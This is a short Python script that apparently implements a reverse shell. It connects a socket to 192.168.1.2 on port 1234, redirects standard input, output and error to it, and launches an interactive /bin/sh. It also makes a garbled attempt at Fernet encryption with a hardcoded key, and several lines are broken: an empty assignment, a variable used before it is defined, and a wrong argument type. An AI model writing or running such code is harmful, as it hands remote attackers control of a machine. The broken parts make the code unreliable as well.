import socket
import subprocess
import os
from cryptography.fernet import Fernet
key =
cipher_suite = Fernet('5dkDgpt9DmBsBCJhZcxwQa-KPlaKGgb9Sl14n5Y0e08=')
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.2",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=cript
cript=cipher_suite.encrypt(subprocess.call(["/bin/sh","-i"]))
